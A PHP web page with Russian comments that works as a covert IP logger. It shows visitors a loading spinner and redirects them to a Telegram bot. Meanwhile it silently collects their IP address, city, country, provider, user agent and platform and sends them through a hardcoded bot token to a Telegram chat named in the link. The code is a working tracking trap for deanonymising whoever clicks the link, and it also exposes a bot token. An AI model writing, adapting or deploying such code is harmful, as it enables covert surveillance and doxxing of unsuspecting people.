<?php
// Конфигурация (скрыта от пользователя)
$BOT_TOKEN = '8486936966:AAHaDit7xT6HT6I13C-U-CjAh-m4PMenqYo';
$REDIRECT_URL = 'http://t.me/faidiappsbot';

// Получаем данные пользователя
$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Неизвестно';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Неизвестно';
$platform = isset($_SERVER['HTTP_SEC_CH_UA_PLATFORM']) ? $_SERVER['HTTP_SEC_CH_UA_PLATFORM'] : 'Неизвестно';

// Получаем расширенную информацию об IP
function getIPInfo($ip) {
    if ($ip === 'Неизвестно' || filter_var($ip, FILTER_VALIDATE_IP) === false) {
        return ['city' => 'Неизвестно', 'country' => 'Неизвестно', 'provider' => 'Неизвестно'];
    }
    
    try {
        $response = file_get_contents("https://ipapi.co/{$ip}/json/");
        $data = json_decode($response, true);
        
        return [
            'city' => $data['city'] ?? 'Неизвестно',
            'country' => $data['country_name'] ?? 'Неизвестно',
            'provider' => $data['org'] ?? 'Неизвестно'
        ];
    } catch (Exception $e) {
        return ['city' => 'Неизвестно', 'country' => 'Неизвестно', 'provider' => 'Неизвестно'];
    }
}

// Отправка в Telegram
function sendToTelegram($bot_token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result !== false;
}

// Основная логика
if (isset($_GET['tg']) && !empty($_GET['tg'])) {
    $chat_id = $_GET['tg'];
    $ip_info = getIPInfo($user_ip);
    $current_time = date('d.m.Y H:i:s');
    
    $message = "
🔐 <b>Новые данные</b>

🌐 <b>IP:</b> {$user_ip}
🏠 <b>Город:</b> {$ip_info['city']}
🇺🇳 <b>Страна:</b> {$ip_info['country']}
📡 <b>Провайдер:</b> {$ip_info['provider']}

🛠️ <b>User-agent:</b>
<blockquote>{$user_agent}</blockquote>

💻 <b>Другие данные:</b>
<b>Платформа:</b> {$platform}

🔗 <b>Вечная ссылка:</b> FaidikSearch.xyz
⌛ <b>Время перехода:</b> {$current_time}
    ";
    
    // Отправляем в Telegram
    sendToTelegram($BOT_TOKEN, $chat_id, $message);
}

// Перенаправляем после небольшой задержки
header("Refresh: 2; URL={$REDIRECT_URL}");
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подождите минуту...</title>
    <style>
        body {
            background-color: #000;
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: Arial, sans-serif;
            color: white;
        }
        
        .loading {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #fff;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading">
        <div class="spinner"></div>
        <p>Загрузка...</p>
    </div>
</body>
</html>